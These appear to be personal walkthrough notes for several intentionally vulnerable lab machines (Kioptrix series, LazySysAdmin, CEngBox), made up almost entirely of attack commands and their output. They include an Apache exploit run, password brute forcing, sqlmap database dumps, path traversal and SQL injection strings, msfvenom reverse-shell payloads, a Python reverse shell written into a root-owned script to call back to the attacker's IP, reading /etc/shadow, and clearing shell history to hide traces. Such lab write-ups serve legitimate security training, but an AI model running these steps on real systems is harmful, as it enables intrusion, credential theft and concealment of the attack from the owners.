KIOPTRIX 1
LEVEL: EASY


1 -  netdiscover -r 192.168.1.0/24


--->  nmap -O 192.168.1.8  ----->  OS CPE: cpe:/o:linux:linux_kernel:2.4
OS details: Linux 2.4.9 

-> nmap -T4 -Pn -sS -p- -A  192.168.1.8

2 -  ./OpenFuck | grep 1.3.20
	./OpenFuck 0x6b 192.168.1.8 443 -c 40
	id -----> root
	-    cat /etc/passwd
	john:x:500:500::/home/john:/bin/bash
	harold:x:501:501::/home/harold:/bin/bash
	-   cat /etc/shadow
	 john:$1$zL4.MR4t$26N4YpTGceBO0gTX6TAky1:14513:0:99999:7:::
	harold:$1$Xx6dZdOd$IMOGACl3r757dv17LZ9010:14513:0:99999:7:::
	root:$1$XROmcfDX$tF93GqnLHOJeGRHpaNyIs0:14513:0:99999:7:::

   

3 -    smb ,  netbios-ssn
	-  use auxiliary/scanner/smb/smb_version  
	Samba 2.2.1a
	-   exploit/linux/samba/trans2open
	-  set payload linux/x86/shell_reverse_tcp
	uid=0(root) gid=0(root) groups=99(nobody)


4 -   ssh 
ssh -l root 192.168.43.65 -oKexAlgorithms=+diffie-hellman-group1-sha1 -c aes128-cbc
hydra -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt ssh://192.168.1.8:22 -t 4 -V
using metasploit: use auxiliary/scanner/ssh/ssh_login

backdoor:
msfvenom -p cmd/unix/reverse_bash LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.sh 
	-  sh shell.sh

#################################################################################################################################

KIOPTRIX 3
LEVEL: EASY

1 - port 80
in login page we have been found web frame work: LotusCMS
exploit/multi/http/lcms_php_exec
set URI /index.php

---->     awk 'BEGIN {system("/bin/bash")}' 


2 -    sqlmap 	-u 	http://kioptrix3.com/gallery/gallery.php?id=1	 --dump

+------+------------+----------------------------------+
| id   | username   | password                         |
+------+------------+----------------------------------+
| 1    | dreg       | 0d3eccfb887aabd50f243b3f155c0f85 |  ------>    Mast3r
| 2    | loneferret | 5badcaf789d3d1d09794d8f021f40f0e |  --------> starwars
+------+------------+----------------------------------+


3 - 	ssh  -l  loneferret    192.168.1.9
cat CompanyPolicy.README
which ht
/usr/local/bin/ht

##################################################################################################################################

KIOPTRIX 5
LEVEL: EASY

1 - 80,8080 
searchsploit pChart
searchsploit -p exploits/php/webapps/31173.txt
cat /usr/share/exploitdb/exploits/php/webapps/31173.txt
--> we use this:
hxxp://localhost/examples/index.php?Action=View&Script=%2f..%2f..%2fetc/passwd

--> we take a look at page source html and then complete the uri:
http://192.168.1.10/pChart2.1.3/examples/index.php?Action=View&Script=%2f..%2f..%2fetc/passwd
http://192.168.1.10/pChart2.1.3/examples/index.php?Action=View&Script=%2f..%2f..%2f/usr/local/etc/apache22/httpd.conf
------->

<VirtualHost *:8080>
    DocumentRoot /usr/local/www/apache22/data2

<Directory "/usr/local/www/apache22/data2">
    Options Indexes FollowSymLinks
    AllowOverride All
    Order allow,deny
    Allow from env=Mozilla4_browser
</Directory>



</VirtualHost>
------------------------------------------------>
It seems like only Mozilla4 browser is allowed to browse the website on that port.
Further Web Port Enumeration (Port 8080)
Burpsuite can be used to change the User-Agent to Mozilla/4.0 (Proxy -> Options) for every http request as per screenshot below.
Once the setting is on the intercept mode can be turned off.
The webpage now becomes available. -----> phptax

-------> use exploit/multi/http/phptax_exec

msf5 exploit(multi/http/phptax_exec) > set rhosts 192.168.1.10
rhosts => 192.168.1.10
msf5 exploit(multi/http/phptax_exec) > set rport 8080
rport => 8080
msf5 exploit(multi/http/phptax_exec) > exploit
uname -a
FreeBSD kioptrix2014 9.0-RELEASE FreeBSD 9.0


- nc -nvlp 9002 < /usr/share/exploitdb/exploits/freebsd/local/28718.c

- in target machine:
nc 192.168.1.9 9002 > exploit.c 

- gcc -o exploit exploit.c

- ./exploit

whoami

root
############################################################################################################################

KIOPTRIX 4
LEVEL: EASY

1- 
use auxiliary/scanner/smb/smb_enumusers
- KIOPTRIX4 [ nobody, robert, root, john, loneferret ] ( LockoutTries=0 PasswordMin=5 )

username:  john
password: 'or'a'='a ------> MyNameIsJohn

2- 
ssh -l john 192.168.1.7
echo os.system("/bin/bash")
cat /var/www/checkpoint.php
$host="localhost"; // Host name
$username="root"; // Mysql username
$password=""; // Mysql password
$db_name="members"; // Database name
$tbl_name="members"; // Table name
----->
ps -ef | grep mysql
locate udf
output shuold have: /usr/lib/lib_mysqludf_sys.so

mysql -u root -p (enter withoutpassword)
select * from mysql.func

- select sys_exec('usermod -a -G admin john')
NUll

- sudo su and write pass (MyNameIsJohn) and become root



##############################################################################################################################################

LAZYSYSADMIN

LEVEL: EASY


1 - # nmap -sS -Pn -sV -p21,22,25,80,8080,139,445 192.168.1.15

    # dirb http://192.168.1.15 -r
    ==> DIRECTORY: http://192.168.1.15/wordpress/ 

2 - smbclient -L \\192.168.1.15\\

3 - smbclient \\\\192.168.1.15\\share$

4 - inside smb basic shell:
    >ls
    >get todolist.txt
    >get deets.txt
    >cd wordpress/
    >get wp-config.php

5 -
vim wp-config.php

/** MySQL database username */
define('DB_USER', 'Admin');

/** MySQL database password */
define('DB_PASSWORD', 'TogieMYSQL12345^^');

/** MySQL hostname */
define('DB_HOST', 'localhost');
 

vim deets.txt 

BF Remembering all these passwords.

Remember to remove this file and update your password after we push out the server.

Password 12345


6 - use exploit/unix/webapp/wp_admin_shell_upload

meterpreter> shell

python -c 'import pty;pty.spawn("/bin/bash")'

$ id

$ su togie
Password: 12345

$  sudo su -
Password: 12345

root@LazySysAdmin:~# cat proof.txt

optional:

root@LazySysAdmin:~# cat /dev/null > ~/.bash_history && history -c     
(history cleared completely)

####################################################################################################################################################

CEngBox walkthrough

LEVEL:  EASY


1 - nmap -sS -T4 -Pn -A -p- 192.168.43.168

(nothing usefull!)

2 - dirb http://192.168.43.168 -r

(nothing usefull!)


3 - focusing on webpage and deeply scanning:

on webpage: cengover@cengbox.com user: cengover 

- dirb http://192.168.43.168 /usr/share/dirb/wordlists/big.txt

==> DIRECTORY: http://192.168.43.168/masteradmin/                              

- dirb http://192.168.43.168/masteradmin /usr/share/dirb/wordlists/common.txt  -X .php -r

---- Scanning URL: http://192.168.43.168/masteradmin/ ----
+ http://192.168.43.168/masteradmin/db.php (CODE:200|SIZE:0)                                                                                                                                 
+ http://192.168.43.168/masteradmin/login.php (CODE:200|SIZE:5137)                                                                                                                           
+ http://192.168.43.168/masteradmin/upload.php (CODE:200|SIZE:1440)                                                                                                                          
                                                                     

4 - in http://192.168.43.168/masteradmin/login.php we test login form for any possible SQL injection:

- sqlmap -u http://192.168.43.168/masteradmin/login.php --forms --dbs --batch

available databases [5]:
[*] cengbox
[*] information_schema
[*] mysql
[*] performance_schema
[*] sys

- sqlmap -u http://192.168.43.168/masteradmin/login.php --forms -D cengbox  --dump-all --batch

Database: cengbox
Table: admin
[1 entry]
+----+---------------+-------------+
| id | password      | username    |
+----+---------------+-------------+
| 1  | C3ng0v3R00T1! | masteradmin |
+----+---------------+-------------+

5 -  then we login to upload page

NOTE: extension not allowed, please choose a CENG file

-  msfvenom -p msfvenom -p  php/meterpreter/reverse_tcp LHOST=192.168.43.250 LPORT=445 -f raw > shell.php

-  mv shell.php shell.php.ceng

- curl  http://192.168.43.168/uploads/shell.php.ceng 


msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 192.168.43.250:445 
[*] Sending stage (39282 bytes) to 192.168.43.168
[*] Meterpreter session 1 opened (192.168.43.250:445 -> 192.168.43.168:38520) at 2020-11-16 14:52:27 +0330

meterpreter > sysinfo
Computer    : cengbox
OS          : Linux cengbox 4.4.0-177-generic #207-Ubuntu SMP Mon Mar 16 01:16:10 UTC 2020 x86_64
Meterpreter : php/linux
meterpreter > 
Server username: www-data (33)
meterpreter> shell

python3 -c 'import pty;pty.spawn("/bin/bash")'

www-data@cengbox:/var/www/html/uploads$ su cengover
Password: C3ng0v3R00T1!

cengover@cengbox:/$ 
user proof in /home:  8f7f6471e2e869f029a75c5de601d5e0



6 - ps aux | grep root


root      2299  0.0  0.0   4500   748 ?        Ss   15:34   0:00 /bin/sh -c /usr/bin/python3 /opt/md5check.py


>>>> we replace python2 reverse shell on md5check.py which has its own root access process :


cengover@cengbox:/opt$ echo 'import socket' > md5check.py

cengover@cengbox:/opt$ echo 'import subprocess' >> md5check.py

cengover@cengbox:/opt$ echo import os >> md5check.py

cengover@cengbox:/opt$ echo 's = socket.socket(socket.AF_INET, socket.SOCK_STREAM)' >> md5check.py

cengover@cengbox:/opt$ echo 's.connect(("192.168.43.250",4444))' >> md5check.py

cengover@cengbox:/opt$ echo 'os.dup2(s.fileno(), 0)' >> md5check.py

cengover@cengbox:/opt$ echo 'os.dup2(s.fileno(), 1)' >> md5check.py

cengover@cengbox:/opt$ echo 'os.dup2(s.fileno(), 2)' >> md5check.py

cengover@cengbox:/opt$ echo 'p=subprocess.call(["/bin/bash", "-i"])' >> md5check.py


7 - nc -nvlp 4444

root@cengbox:~# cat root.txt
cat root.txt
 / ____|  ____|           |  _ \           
| |    | |__   _ __   __ _| |_) | _____  __
| |    |  __| | '_ \ / _` |  _ < / _ \ \/ /
| |____| |____| | | | (_| | |_) | (_) >  < 
 \_____|______|_| |_|\__, |____/ \___/_/\_\
                      __/ |                
                     |___/                 

Congrats. Hope you enjoyed it and you can contact me on Twitter @arslanblcn_

a51e522b22a439b8e1b22d84f71cf0f2

------> clear history :

cengover@cengbox:/opt$ cat /dev/null > ~/.bash_history && history -c 

and

root@cengbox:~# cat /dev/null > ~/.bash_history && history -c

####################################################################################################################################################





